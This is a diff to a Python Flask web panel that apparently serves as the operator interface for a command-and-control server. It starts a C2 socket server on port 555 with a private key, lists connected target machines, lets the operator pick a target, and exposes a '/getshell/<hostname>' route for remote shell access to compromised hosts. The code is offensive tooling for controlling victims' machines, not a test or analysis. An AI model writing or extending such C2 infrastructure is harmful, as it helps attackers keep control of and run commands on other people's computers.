@@ -1,17 +1,18 @@
 from flask import *
 import os
 from .IntrnalSocketServer import IntrnalSocketServer
+from Socket.Server import Server
 import threading
 
 class FlskSevrev(object):
     
-    def __init__(self,c2Server):
+    def __init__(self,C2Private,C2Port=555):
         self._internalSock = IntrnalSocketServer()
         self._internalSock.start()
         self.app = Flask(__name__, static_folder=os.path.join(os.getcwd(),'templates','static'))
-        self.c2Server = c2Server
-        self.targetConnction = c2Server.Connection
-        self._c2Thread = threading.Thread(target = c2Server.__listener__).start()
+        self.c2Server = Server(port=C2Port,PrivateKey=C2Private)
+        self.c2Server.start()
+        self.targetConnction = self.c2Server.connection
         self._ruleResetor()
         
 
@@ -21,6 +22,11 @@ class FlskSevrev(object):
     def choseTarget(self,targetIp):
         self.c2Server.connected = targetIp
 
+    def listConnections(self):
+        return {'Connections': self.c2Server.connections}
+    
+    def homePage(self):
+        return render_template('mainIndex.html')
 
     def send_message(self):
         data = request.get_json()
@@ -35,6 +41,8 @@ class FlskSevrev(object):
         return f"{host}: admin"
     
     def _ruleResetor(self):
+        self.app.add_url_rule('/', 'homePage', self.homePage)
+        self.app.add_url_rule('/listConnections', 'listConnections', self.listConnections)
         self.app.add_url_rule('/getshell/<hostname>', 'getshell', self.getshell)
         self.app.add_url_rule('/send_message', 'send_message', self.send_message, methods=['POST'])
         self.app.add_url_rule(
